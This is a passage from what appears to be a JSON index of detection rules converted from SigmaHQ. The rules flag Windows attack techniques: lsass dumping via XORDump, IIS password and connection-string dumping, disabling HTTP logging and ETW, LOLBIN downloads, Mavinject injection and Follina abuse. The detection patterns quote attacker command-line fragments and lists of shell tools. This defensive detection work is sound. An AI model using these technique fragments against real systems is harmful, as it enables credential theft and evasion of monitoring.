Detects suspicious use of XORDump process memory dumping utility\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\xordump.exe' || evt.Parsed.CommandLine contains ' -process lsass.exe ' || evt.Parsed.CommandLine contains ' -m comsvcs ' || evt.Parsed.CommandLine contains ' -m dbghelp ' || evt.Parsed.CommandLine contains ' -m dbgcore ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n   - attack.t1003.001\n\n  label: \"HackTool - XORDump Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious use of XORDump process memory dumping utility\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_xordump.yml", "version": "0.2", "versions": {"0.1": {"digest": "7dd3f0ab883096858d44aa3fdd866e68b43ae1d3d020f3ffe7eba610719ea318"}, "0.2": {"digest": "245dab072e52f334974189caa2b2d40993d59cfec6cc55db233dc219fdc572e1"}}}, "sigmahq/proc_creation_win_hwp_exploits": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hwp_exploits\ndescription: |\n  Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\Hwp.exe' && evt.Parsed.Image endsWith '\\\\gbb.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1566.001\n   - attack.t1203\n   - attack.t1059.003\n\n  label: \"Suspicious HWP Sub Processes\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation\n", "path": "scenarios/sigmahq/proc_creation_win_hwp_exploits.yml", "version": "0.2", "versions": {"0.1": {"digest": "6798eb7f6d8e8b78380c8a0c8e2b510f8e9e609b29bbdfe4b5ef7c36c9deb8e2"}, "0.2": {"digest": "9e4ce6120c5ebcd459c233564a7808b76cdf638e833dab3c1ff93bf6a7d9700f"}}}, "sigmahq/proc_creation_win_ieexec_download": {"content": "type: trigger\nname: sigmahq/proc_creation_win_ieexec_download\ndescription: |\n  Detects execution of the IEExec utility to download and execute files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\IEExec.exe' || evt.Parsed.OriginalFileName == 'IEExec.exe') && (evt.Parsed.CommandLine contains 'http://' || evt.Parsed.CommandLine contains 'https://'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n\n  label: \"File Download And Execution Via IEExec.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the IEExec utility to download and execute files\n", "path": "scenarios/sigmahq/proc_creation_win_ieexec_download.yml", "version": "0.2", "versions": {"0.1": {"digest": "7881ebc98b841c6b399a521467b5e95b336ee1290d769586509d35c7de7c323f"}, "0.2": {"digest": "19a311dde1b33d7ada4a3bfadf95d94b15395deb44fa6466c0055f412154e2c2"}}}, "sigmahq/proc_creation_win_iis_appcmd_http_logging": {"content": "type: trigger\nname: sigmahq/proc_creation_win_iis_appcmd_http_logging\ndescription: |\n  Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\appcmd.exe' || evt.Parsed.OriginalFileName == 'appcmd.exe') && evt.Parsed.CommandLine contains 'set' && evt.Parsed.CommandLine contains 'config' && evt.Parsed.CommandLine contains 'section:httplogging' && evt.Parsed.CommandLine contains 'dontLog:true')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.002\n\n  label: \"Disable Windows IIS HTTP Logging\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)\n", "path": "scenarios/sigmahq/proc_creation_win_iis_appcmd_http_logging.yml", "version": "0.2", "versions": {"0.1": {"digest": "2c614a8eae1f4b840c4c312dac862352d169baa128a4e48bf9c1985c4f79cd81"}, "0.2": {"digest": "e34c3909f9ba6b6e4adfe0e27156b308481f7aaf2026ef536261f24b47df1fc7"}}}, "sigmahq/proc_creation_win_iis_appcmd_service_account_password_dumped": {"content": "type: trigger\nname: sigmahq/proc_creation_win_iis_appcmd_service_account_password_dumped\ndescription: |\n  Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\appcmd.exe' || evt.Parsed.OriginalFileName == 'appcmd.exe') && evt.Parsed.CommandLine contains 'list ' && (evt.Parsed.CommandLine contains ' /config' || evt.Parsed.CommandLine contains ' /xml' || evt.Parsed.CommandLine contains ' -config' || evt.Parsed.CommandLine contains ' -xml' || (evt.Parsed.CommandLine contains ' /@t' || evt.Parsed.CommandLine contains ' /text' || evt.Parsed.CommandLine contains ' /show' || evt.Parsed.CommandLine contains ' -@t' || evt.Parsed.CommandLine contains ' -text' || evt.Parsed.CommandLine contains ' -show') && (evt.Parsed.CommandLine contains ':*' || evt.Parsed.CommandLine contains 'password')))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003\n\n  label: \"Microsoft IIS Service Account Password Dumped\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords\n", "path": "scenarios/sigmahq/proc_creation_win_iis_appcmd_service_account_password_dumped.yml", "version": "0.2", "versions": {"0.1": {"digest": "023e8eb9ec0bea9c9c1a1ed071015284a84c2271e250bf81107490e3cc8ad72b"}, "0.2": {"digest": "079b4dc1e489346a16c25f26cfeac5aac1aefc151ff35c8df4d476b9dc482aa0"}}}, "sigmahq/proc_creation_win_iis_connection_strings_decryption": {"content": "type: trigger\nname: sigmahq/proc_creation_win_iis_connection_strings_decryption\ndescription: |\n  Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\aspnet_regiis.exe' || evt.Parsed.OriginalFileName == 'aspnet_regiis.exe') && evt.Parsed.CommandLine contains 'connectionStrings' && evt.Parsed.CommandLine contains ' -pdf')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003\n\n  label: \"Microsoft IIS Connection Strings Decryption\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command.\n", "path": "scenarios/sigmahq/proc_creation_win_iis_connection_strings_decryption.yml", "version": "0.2", "versions": {"0.1": {"digest": "4055db6cff9c1b3e7ef33d613afad69c1029b29a114e0616a67325f735a1f108"}, "0.2": {"digest": "cf7091d82775654f60267b19c6b967a25ad5dfd1b869612cf6b8d0a3a966632f"}}}, "sigmahq/proc_creation_win_iis_susp_module_registration": {"content": "type: trigger\nname: sigmahq/proc_creation_win_iis_susp_module_registration\ndescription: |\n  Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\w3wp.exe' && (evt.Parsed.CommandLine contains 'appcmd.exe add module' || evt.Parsed.CommandLine contains ' system.enterpriseservices.internal.publish' && evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.CommandLine contains 'gacutil' && evt.Parsed.CommandLine contains ' /I'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1505.004\n\n  label: \"Suspicious IIS Module Registration\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors\n", "path": "scenarios/sigmahq/proc_creation_win_iis_susp_module_registration.yml", "version": "0.2", "versions": {"0.1": {"digest": "3a0cb40643f114ca3ea73cf7a741d032f1f202057b54c66599db979f59183d02"}, "0.2": {"digest": "34c0ffbd042f19940527441dd57972e803b8f1b20cfa581d1fa6bfd56f2c0019"}}}, "sigmahq/proc_creation_win_imagingdevices_unusual_parents": {"content": "type: trigger\nname: sigmahq/proc_creation_win_imagingdevices_unusual_parents\ndescription: |\n  Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\WmiPrvSE.exe' || evt.Parsed.ParentImage endsWith '\\\\svchost.exe' || evt.Parsed.ParentImage endsWith '\\\\dllhost.exe') && evt.Parsed.Image endsWith '\\\\ImagingDevices.exe' || evt.Parsed.ParentImage endsWith '\\\\ImagingDevices.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"ImagingDevices Unusual Parent/Child Processes\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity\n", "path": "scenarios/sigmahq/proc_creation_win_imagingdevices_unusual_parents.yml", "version": "0.2", "versions": {"0.1": {"digest": "74137ac4cab027b6179efca13217c64e4be6085a8017b0d52e7a12053d7ad2f8"}, "0.2": {"digest": "0c1acec5ccc3258d0fdc341feb59c9726cf720eb0a53c854dc800da0741d617a"}}}, "sigmahq/proc_creation_win_imewbdld_download": {"content": "type: trigger\nname: sigmahq/proc_creation_win_imewbdld_download\ndescription: |\n  Detects usage of \"IMEWDBLD.exe\" to download arbitrary files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\IMEWDBLD.exe' || evt.Parsed.OriginalFileName == 'imewdbld.exe') && (evt.Parsed.CommandLine contains 'http://' || evt.Parsed.CommandLine contains 'https://'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Arbitrary File Download Via IMEWDBLD.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of \"IMEWDBLD.exe\" to download arbitrary files\n", "path": "scenarios/sigmahq/proc_creation_win_imewbdld_download.yml", "version": "0.2", "versions": {"0.1": {"digest": "73d22ae860b021b8e9d92ae8f2d9b3bb961a0aae8790602a09b9ede174d14d89"}, "0.2": {"digest": "e27d4d93f97c5f19575a4287140701fec3b83e7200cabfd391794e338ba9402b"}}}, "sigmahq/proc_creation_win_java_keytool_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_java_keytool_susp_child_process\ndescription: |\n  Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\keytool.exe' && (evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\whoami.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\scrcons.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\hh.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\forfiles.exe' || evt.Parsed.Image endsWith '\\\\scriptrunner.exe' || evt.Parsed.Image endsWith '\\\\mftrace.exe' || evt.Parsed.Image endsWith '\\\\AppVLP.exe' || evt.Parsed.Image endsWith '\\\\systeminfo.exe' || evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.Image endsWith '\\\\query.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious Shells Spawn by Java Utility Keytool\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)\n", "path": "scenarios/sigmahq/proc_creation_win_java_keytool_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "9204ddf4da8a279f742d85b068d60dc932bd48f4b166a8b3d26dd1c948fa8e00"}, "0.2": {"digest": "c15ea633d5f551a2d55709b066c4096596c7729af287367572b914d19f18e9eb"}}}, "sigmahq/proc_creation_win_java_manageengine_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_java_manageengine_susp_child_process\ndescription: |\n  Detects suspicious child processes of the \"Manage Engine ServiceDesk Plus\" Java web service\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage contains '\\\\ManageEngine\\\\ServiceDesk\\\\' && evt.Parsed.ParentImage contains '\\\\java.exe' && (evt.Parsed.Image endsWith '\\\\AppVLP.exe' || evt.Parsed.Image endsWith '\\\\bash.exe' || evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\calc.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\curl.exe' || evt.Parsed.Image endsWith '\\\\forfiles.exe' || evt.Parsed.Image endsWith '\\\\mftrace.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe' || evt.Parsed.Image endsWith '\\\\notepad.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\query.exe' || evt.Parsed.Image endsWith '\\\\reg.exe' || evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\scrcons.exe' || evt.Parsed.Image endsWith '\\\\sh.exe' || evt.Parsed.Image endsWith '\\\\systeminfo.exe' || evt.Parsed.Image endsWith '\\\\whoami.exe' || evt.Parsed.Image endsWith '\\\\wmic.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe') && not ((evt.Parsed.Image endsWith '\\\\net.exe' || evt.Parsed.Image endsWith '\\\\net1.exe') && evt.Parsed.CommandLine contains ' stop'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1102\n\n  label: \"Suspicious Child Process Of Manage Engine ServiceDesk\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious child processes of the \"Manage Engine ServiceDesk Plus\" Java web service\n", "path": "scenarios/sigmahq/proc_creation_win_java_manageengine_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "f994ceb50b5aa34699735f3f224c0a9e3d9bb86163f381a23b17d558f6923e14"}, "0.2": {"digest": "a4f9778ab1fbf30f756709484f1a0dc1d8d3e06d07d458aed5dc54d08706ecc1"}}}, "sigmahq/proc_creation_win_kavremover_uncommon_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_kavremover_uncommon_execution\ndescription: |\n  Detects the execution of a signed binary dropped by Kaspersky Lab Products Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands and binaries.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' run run-cmd ' && not (evt.Parsed.ParentImage endsWith '\\\\cleanapi.exe' || evt.Parsed.ParentImage endsWith '\\\\kavremover.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1127\n\n  label: \"Kavremover Dropped Binary LOLBIN Usage\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of a signed binary dropped by Kaspersky Lab Products Remover (kavremover) which can be abused as a LOLBIN to execute arbitrary commands and binaries.\n", "path": "scenarios/sigmahq/proc_creation_win_kavremover_uncommon_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "d65fab56695c8a9a5e6e862d94bfa8f81263691a3a6fa5a9fcd8bf7c05aed156"}, "0.2": {"digest": "066ace9100a3a555c6df9dc994a3ba66c86227c8139aa6c8fcc8fc843dc1b8a4"}}}, "sigmahq/proc_creation_win_logman_disable_eventlog": {"content": "type: trigger\nname: sigmahq/proc_creation_win_logman_disable_eventlog\ndescription: |\n  Detects the execution of \"logman\" utility in order to disable or delete Windows trace sessions\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\logman.exe' || evt.Parsed.OriginalFileName == 'Logman.exe') && (evt.Parsed.CommandLine contains 'stop ' || evt.Parsed.CommandLine contains 'delete ') && (evt.Parsed.CommandLine contains 'Circular Kernel Context Logger' || evt.Parsed.CommandLine contains 'EventLog-' || evt.Parsed.CommandLine contains 'SYSMON TRACE' || evt.Parsed.CommandLine contains 'SysmonDnsEtwSession'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n   - attack.t1070.001\n\n  label: \"Suspicious Windows Trace ETW Session Tamper Via Logman.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of \"logman\" utility in order to disable or delete Windows trace sessions\n", "path": "scenarios/sigmahq/proc_creation_win_logman_disable_eventlog.yml", "version": "0.2", "versions": {"0.1": {"digest": "89997a55195f15514a18873db8f0042bcc1b5e36fb922b24d2842afbb3f58fff"}, "0.2": {"digest": "bcd5ed69d4eda4129c751de3f618d74c13a32c4b96b2d70344010acf9a36bec2"}}}, "sigmahq/proc_creation_win_lolbin_devtoolslauncher": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_devtoolslauncher\ndescription: |\n  The Devtoolslauncher.exe executes other binary\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\devtoolslauncher.exe' && evt.Parsed.CommandLine contains 'LaunchForDeploy')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Devtoolslauncher.exe Executes Specified Binary\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "The Devtoolslauncher.exe executes other binary\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_devtoolslauncher.yml", "version": "0.2", "versions": {"0.1": {"digest": "4a14aa1d1249ff44b393c7718856dd28c7ece6fe1e10ff4c0505210236f441d7"}, "0.2": {"digest": "bb75da90d49c9179aa9bb124d4e90eacae25f89d664010fd17d4400113e0a216"}}}, "sigmahq/proc_creation_win_lolbin_manage_bde": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_manage_bde\ndescription: |\n  Detects potential abuse of the \"manage-bde.wsf\" script as a LOLBIN to proxy execution\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.OriginalFileName == 'wscript.exe') && evt.Parsed.CommandLine contains 'manage-bde.wsf' || (evt.Parsed.ParentImage endsWith '\\\\cscript.exe' || evt.Parsed.ParentImage endsWith '\\\\wscript.exe') && evt.Parsed.ParentCommandLine contains 'manage-bde.wsf' && not (evt.Parsed.Image endsWith '\\\\cmd.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1216\n\n  label: \"Potential Manage-bde.wsf Abuse To Proxy Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential abuse of the \"manage-bde.wsf\" script as a LOLBIN to proxy execution\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_manage_bde.yml", "version": "0.2", "versions": {"0.1": {"digest": "3cf28121c93f179b1ec38a833b154bb89da4fb172f65d061f24b1b75ff2df86c"}, "0.2": {"digest": "ba3142ffb63a98af52355440a961b0c6fa9ba81d45f3eb00a4094921bf160d72"}}}, "sigmahq/proc_creation_win_lolbin_mavinject_process_injection": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_mavinject_process_injection\ndescription: |\n  Detects process injection using the signed Windows tool \"Mavinject\" via the \"INJECTRUNNING\" flag\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains ' /INJECTRUNNING ' && not (evt.Parsed.ParentImage == 'C:\\\\Windows\\\\System32\\\\AppVClient.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1055.001\n   - attack.t1218.013\n\n  label: \"Mavinject Inject DLL Into Running Process\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects process injection using the signed Windows tool \"Mavinject\" via the \"INJECTRUNNING\" flag\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_mavinject_process_injection.yml", "version": "0.2", "versions": {"0.1": {"digest": "616168a07383ae14de32f161704d1d03b1280ff65ef160609665db936afa0dcc"}, "0.2": {"digest": "6c45dd2c39cd99f9a94c4c0305aa9be21ea6a3e1d0c640645c49ab6199ba6f6d"}}}, "sigmahq/proc_creation_win_lolbin_mpiexec": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_mpiexec\ndescription: |\n  Detects a certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\mpiexec.exe' || evt.Parsed.Imphash == 'd8b52ef6aaa3a81501bdfff9dbb96217' || evt.Parsed.Hashes contains 'IMPHASH=d8b52ef6aaa3a81501bdfff9dbb96217') && (evt.Parsed.CommandLine contains ' /n 1 ' || evt.Parsed.CommandLine contains ' -n 1 '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"MpiExec Lolbin\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a certain command line flag combination used by mpiexec.exe LOLBIN from HPC pack that can be used to execute any other binary\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_mpiexec.yml", "version": "0.2", "versions": {"0.1": {"digest": "57797a124cdf8fdb24f63e407004338857a50f6cd689d180ca11f90b0f5bd314"}, "0.2": {"digest": "ecf6d5f9a8a37a48057ec0d1157d45f61c01138313cdd48944c370ffa21a397a"}}}, "sigmahq/proc_creation_win_lolbin_msdt_answer_file": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_msdt_answer_file\ndescription: |\n  Detects execution of \"msdt.exe\" using an answer file which is simulating the legitimate way of calling msdt via \"pcwrun.exe\" (For example from the compatibility tab)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\msdt.exe' && evt.Parsed.CommandLine contains '\\\\WINDOWS\\\\diagnostics\\\\index\\\\PCWDiagnostic.xml' && (evt.Parsed.CommandLine contains ' -af ' || evt.Parsed.CommandLine contains ' /af ') && not (evt.Parsed.ParentImage endsWith '\\\\pcwrun.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Execute MSDT Via Answer File\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"msdt.exe\" using an answer file which is simulating the legitimate way of calling msdt via \"pcwrun.exe\" (For example from the compatibility tab)\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_msdt_answer_file.yml", "version": "0.2", "versions": {"0.1": {"digest": "74f9bb17ed17a3815138ea9f0f0d37fcd7ca63d73a2e8ac161365695d0d7473e"}, "0.2": {"digest": "b83c8e716ece411487dd93cd27f229acf62068300309bafd825c671cdd3a86f1"}}}, "sigmahq/proc_creation_win_lolbin_openwith": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_openwith\ndescription: |\n  The OpenWith.exe executes other binary\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\OpenWith.exe' && evt.Parsed.CommandLine contains '/c')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"OpenWith.exe Executes Specified Binary\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "The OpenWith.exe executes other binary\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_openwith.yml", "version": "0.2", "versions": {"0.1": {"digest": "f65a7dce965e74f1ce1d564d514d5306dd6adde6158d7352942f484728d5976a"}, "0.2": {"digest": "2b805189b53317c228ee5fa7de61d9f098c0f38a4ac0b7bfbff5415ea5126faa"}}}, "sigmahq/proc_creation_win_lolbin_pcwrun_follina": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_pcwrun_follina\ndescription: |\n  Detects indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\pcwrun.exe' && evt.Parsed.CommandLine contains '../')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Execute Pcwrun.EXE To Leverage Follina\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability\n", "path": "scenarios/sigmahq/proc_creation_win_lolbin_pcwrun_follina.yml", "version": "0.2", "versions": {"0.1": {"digest": "c529a5b5ee0dbb7d2281a860e6a21660a82666201137bea20b1c2eb7ef707c19"}, "0.2": {"digest": "e8c9d5882ab2bf3b51c5eea84ff0dda84e86621e7401e11e6fda9acb107b917b"}}}, "sigmahq/proc_creation_win_lolbin_printbrm": {"content": "type: trigger\nname: sigmahq/proc_creation_win_lolbin_printbrm\ndescription: |\n  Detects the execution of the LOLBIN PrintBrm.exe, which can be used to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\PrintBrm.exe' && evt.Parsed.CommandLine contains ' -f' && evt.Parsed.CommandLine contains '.zip')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n   - attack.t1564.004\n\n  label: \"PrintBrm ZIP Creation of Extraction\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": 